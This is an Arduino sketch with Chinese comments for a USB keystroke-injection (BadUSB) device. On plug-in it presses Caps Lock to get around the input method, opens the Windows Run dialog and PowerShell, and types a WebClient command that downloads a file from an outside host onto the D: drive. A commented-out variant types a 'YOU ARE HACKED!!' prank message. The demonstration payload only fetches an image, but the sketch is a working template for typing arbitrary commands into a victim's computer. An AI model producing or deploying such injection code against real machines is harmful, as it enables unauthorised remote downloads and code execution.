#include <Keyboard.h>

/*
 * 危险
*/

/* API
Keyboard.begin()开启键盘通信
Keyboard.end()结束键盘通信
Keyboard.press()按下键盘某一键
Keyboard.print()模拟键盘输入字符
Keyboard.println()模拟键盘输入字符并回车
Keyboard.release()松开键盘某一键
Keyboard.releaseAll()松开所有键
Keyboard.write()模拟键盘输出ASCII码或Hex值对应的按键
 * 
 * 宏
KEY_LEFT_CTRL             0x80
KEY_LEFT_SHIFT            0x81
KEY_LEFT_ALT               0x82
KEY_LEFT_GUI               0x83
KEY_RIGHT_CTRL           0x84
KEY_RIGHT_SHIFT          0x85
KEY_RIGHT_ALT             0x86
KEY_RIGHT_GUI             0x87
KEY_UP_ARROW            0xDA
KEY_DOWN_ARROW     0xD9
KEY_LEFT_ARROW         0xD8
KEY_BACKSPACE           0xB2
KEY_TAB                        0xB3
KEY_RETURN                 0xB0
KEY_ESC                        0xB1
KEY_INSERT                   0xD1
KEY_DELETE                   0xD4
KEY_PAGE_UP                0xD3
KEY_PAGE_DOWN         0xD6
KEY_HOME                    0xD2
KEY_END                       0xD5
KEY_CAPS_LOCK           0xC1
KEY_F1                          0xC2
KEY_F2                          0xC3
KEY_F4                          0xC5
KEY_F5                          0xC6
KEY_F6                          0xC7
KEY_F7                          0xC8
KEY_F8                          0xC9
KEY_F9                          0xCA
KEY_F10                        0xCB
KEY_F11                         0xCC
KEY_F12                        0xCD
*/

//*********************************
int LED=8;
int KEY=9;
int k=500;//延时ms
//**********************************


//保护函数，勿动
void pase()
{
  if (analogRead(KEY)==0)
  {
      delay(50);
      while(analogRead(KEY)==0)
      {
        digitalWrite(LED, 1);
        delay(50);
      }
  }
}

//用户代码
void user()
{
  Keyboard.press(KEY_LEFT_GUI);//菜单+r
  Keyboard.press('r');
  delay(k); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r'); 
  delay(k);

  /*
  Keyboard.println("CMD /T:08 /K MODE CON: COLS=15 LINES=1");//打开很小的CMD
  delay(700);
  Keyboard.println("NOTEPAD");//打开笔记本
  delay(k);
  Keyboard.print("HAHAHAHAHAHA!");
  Keyboard.println("YOU ARE HACKED!!");
  */
  Keyboard.println("POWERSHELL");
  delay(700);
  Keyboard.println("$client = new-object System.Net.WebClient");
  delay(k);
  Keyboard.print("$client.DownloadFile('https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/baike/pic/item/738b4710b912c8fcb90b8620f6039245d7882166.jpg'");
  Keyboard.println(",'D:\a.jpg')");
  delay(k);
  
}

//运行入口
void setup()
{ 
  //初始化硬件
  pinMode(LED,OUTPUT);
  pinMode(KEY,INPUT);
  digitalWrite(LED, 1);

  //初始化软件
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK);//开启大写锁，绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(k);
  pase();//检测保护，勿删
  digitalWrite(LED, 0);
  
  user();
  Keyboard.end();
}

//循环体
void loop()
{
  
}
